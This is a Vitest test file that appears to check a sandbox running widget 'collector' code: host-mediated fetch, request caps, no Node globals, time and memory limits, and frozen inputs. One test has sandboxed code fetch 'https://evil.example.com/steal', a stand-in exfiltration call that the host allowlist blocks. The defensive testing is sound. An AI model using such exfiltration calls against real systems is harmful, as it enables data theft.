import { describe, expect, it, vi } from 'vitest'
import { type HostFetch, type RunInput, runCollector } from './run.ts'

const refuse: HostFetch = async () => {
  throw new Error('no network in this test')
}

const run = (code: string, patch: Partial<RunInput> = {}) =>
  runCollector({ code, config: {}, secrets: {}, sources: {}, fetch: refuse, ...patch })

const answer = (body: unknown): HostFetch =>
  vi.fn<HostFetch>(async (request) => ({
    status: 200,
    statusText: 'OK',
    url: request.url,
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  }))

describe('runCollector', () => {
  it('runs a collector and returns its JSON', async () => {
    const result = await run(
      `import { defineCollector } from '@shiftpane/widget-sdk'
      export default defineCollector(async ({ config, sources, secrets }) => ({
        owner: config.owner,
        gpu: sources.gpu.percent,
        hasToken: Boolean(secrets.TOKEN),
      }))`,
      { config: { owner: 'kwiruu' }, sources: { gpu: { percent: 42 } }, secrets: { TOKEN: 't' } },
    )
    expect(result).toEqual({ ok: true, output: { owner: 'kwiruu', gpu: 42, hasToken: true } })
  })

  it('hands requests to the host and gives back its answer', async () => {
    const fetch = answer({ stargazers_count: 7 })
    const result = await run(
      `export default async ({ fetch }) => {
        const response = await fetch('https://api.github.com/repos/x/y', {
          headers: { Accept: 'application/json' },
        })
        const repo = await response.json()
        return { ok: response.ok, type: response.headers.get('Content-Type'), stars: repo.stargazers_count }
      }`,
      { fetch },
    )
    expect(result).toEqual({
      ok: true,
      output: { ok: true, type: 'application/json', stars: 7 },
    })
    expect(vi.mocked(fetch).mock.calls[0]?.[0]).toEqual({
      url: 'https://api.github.com/repos/x/y',
      method: 'GET',
      headers: { Accept: 'application/json' },
    })
  })

  it('passes a refused request on to the collector as a failed fetch', async () => {
    const fetch: HostFetch = async (request) => {
      throw new Error(`${new URL(request.url).hostname} isn't one of this widget's hosts`)
    }
    const caught = await run(
      `export default async ({ fetch }) => {
        try { await fetch('https://evil.example.com/steal'); return { reached: true } }
        catch (error) { return { reached: false, why: error.message } }
      }`,
      { fetch },
    )
    expect(caught).toEqual({
      ok: true,
      output: { reached: false, why: "evil.example.com isn't one of this widget's hosts" },
    })
    const thrown = await run(
      `export default async ({ fetch }) => (await fetch('https://evil.example.com')).json()`,
      { fetch },
    )
    expect(thrown).toEqual({
      ok: false,
      error: "evil.example.com isn't one of this widget's hosts",
    })
  })

  it('caps how many requests a run makes', async () => {
    const fetch = answer({})
    const result = await run(
      `export default async ({ fetch }) => {
        for (let i = 0; i < 50; i++) await fetch('https://api.github.com/' + i)
        return {}
      }`,
      { fetch, limits: { fetches: 3 } },
    )
    expect(result).toEqual({ ok: false, error: 'a collector may make 3 requests per run' })
    expect(fetch).toHaveBeenCalledTimes(3)
  })

  it('has no Node, no require and no other modules', async () => {
    const result = await run(`export default () => ({
      process: typeof process,
      require: typeof require,
      fetch: typeof globalThis.fetch,
      host: typeof globalThis.__hostFetch,
    })`)
    expect(result).toEqual({
      ok: true,
      output: { process: 'undefined', require: 'undefined', fetch: 'undefined', host: 'undefined' },
    })
    const imported = await run(`import fs from 'node:fs'\nexport default () => ({})`)
    expect(imported.ok).toBe(false)
    if (!imported.ok) expect(imported.error).toMatch(/only import defineCollector/)
  })

  it('stops a collector that never yields', async () => {
    const started = Date.now()
    const result = await run('export default () => { for (;;) {} }', { limits: { sliceMs: 50 } })
    expect(result).toEqual({ ok: false, error: 'it ran for too long' })
    expect(Date.now() - started).toBeLessThan(2000)
  })

  it('stops a collector that waits forever', async () => {
    const result = await run('export default () => new Promise(() => {})', {
      limits: { timeoutMs: 200 },
    })
    expect(result).toEqual({ ok: false, error: 'it took longer than 0.2 s' })
  })

  it('stops a collector that eats memory, and runs the next one as usual', async () => {
    const eaten = await run(
      'export default () => { const all = []; for (;;) all.push(new Array(10000).fill(all.length)) }',
      { limits: { sliceMs: 5000 } },
    )
    expect(eaten).toEqual({ ok: false, error: 'it used too much memory' })
    const huge = await run('export default () => ({ n: new Array(5e7).fill(0).length })')
    expect(huge).toEqual({ ok: false, error: 'it used too much memory' })
    expect(await run('export default () => ({ fine: true })')).toEqual({
      ok: true,
      output: { fine: true },
    })
  })

  it('refuses output that is too big or not an object', async () => {
    expect(await run(`export default () => ({ s: 'x'.repeat(70000) })`)).toEqual({
      ok: false,
      error: 'it returned more than 64 KB',
    })
    expect(await run('export default () => [1, 2]')).toEqual({
      ok: false,
      error: 'it has to return a JSON object',
    })
  })

  it('reports a collector that throws, or exports nothing to run', async () => {
    expect(await run(`export default () => { throw new Error('GitHub answered 404') }`)).toEqual({
      ok: false,
      error: 'GitHub answered 404',
    })
    const none = await run('export const x = 1')
    expect(none.ok).toBe(false)
    if (!none.ok) expect(none.error).toMatch(/has to export a collector/)
  })

  it('lets the collector read but not change what it was given', async () => {
    const result = await run(
      `export default ({ sources, config }) => {
        let changed = true
        try { sources.gpu.percent = 0 } catch { changed = false }
        return { changed, percent: sources.gpu.percent, frozen: Object.isFrozen(config) }
      }`,
      { sources: { gpu: { percent: 42 } } },
    )
    expect(result).toEqual({ ok: true, output: { changed: false, percent: 42, frozen: true } })
  })

  it('passes console output to the host', async () => {
    const log = vi.fn()
    await run(`export default () => { console.log('hello', { n: 1 }); return {} }`, { log })
    expect(log).toHaveBeenCalledWith('hello {"n":1}')
  })
})
